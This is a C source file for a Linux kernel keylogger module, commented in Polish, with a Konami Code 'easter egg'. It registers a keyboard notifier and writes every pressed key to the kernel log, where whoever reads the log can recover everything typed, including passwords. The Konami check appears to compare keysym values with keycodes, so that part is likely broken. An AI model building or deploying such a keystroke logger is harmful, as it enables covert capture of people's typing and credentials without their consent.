#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/input.h>
#include <linux/notifier.h>
#include <linux/keyboard.h>
#include <linux/kthread.h>
#include <linux/delay.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Olga i Kubus");
MODULE_DESCRIPTION("Moduł Keylogger z Easter Egg");
MODULE_VERSION("1.1");

// Sekwencja Konami Code: ↑ ↑ ↓ ↓ ← → ← → B A
static const int konami_code[] = {KEY_UP, KEY_UP, KEY_DOWN, KEY_DOWN, KEY_LEFT, KEY_RIGHT, KEY_LEFT, KEY_RIGHT, KEY_B, KEY_A};
static const int konami_length = sizeof(konami_code) / sizeof(konami_code[0]);
static int konami_index = 0;

// Funkcja aktywacji Easter Egg
static void activate_easter_egg(void) {
    printk(KERN_INFO "Keylogger: Konami Code rozpoznany! Aktywowanie Easter Egg.\n");

    // Emituj sygnał dźwiękowy
    int i;
    for (i = 0; i < 3; i++) {
        printk(KERN_INFO "\a"); // Sygnalizuje dźwięk w terminalu
        msleep(300);
    }

    // Wyświetl komunikat
    printk(KERN_INFO "Keylogger: Sekret odkryty! Gratulacje!\n");
}

static int keylogger_notify(struct notifier_block *nblock, unsigned long code, void *_param) {
    struct keyboard_notifier_param *param = _param;

    if (code == KBD_KEYSYM && param->down) {
        int key = param->value;

        // Sprawdź, czy naciśnięty klawisz jest zgodny z Konami Code
        if (key == konami_code[konami_index]) {
            konami_index++;
            if (konami_index == konami_length) {
                activate_easter_egg();
                konami_index = 0; // Zresetuj indeks po aktywacji
            }
        } else {
            konami_index = 0; // Resetuj, jeśli sekwencja się nie zgadza
        }

        // Zapisywanie klawiszy do logów jądra
        printk(KERN_INFO "Keylogger: Naciśnięty klawisz: %d\n", key);
    }

    return NOTIFY_OK;
}

static struct notifier_block nb = {
    .notifier_call = keylogger_notify
};

static int __init keylogger_init(void) {
    printk(KERN_INFO "Keylogger: Wczytywanie modułu z Easter Egg\n");
    register_keyboard_notifier(&nb);
    return 0;
}

static void __exit keylogger_exit(void) {
    unregister_keyboard_notifier(&nb);
    printk(KERN_INFO "Keylogger: Wyłączanie modułu\n");
}

module_init(keylogger_init);
module_exit(keylogger_exit);
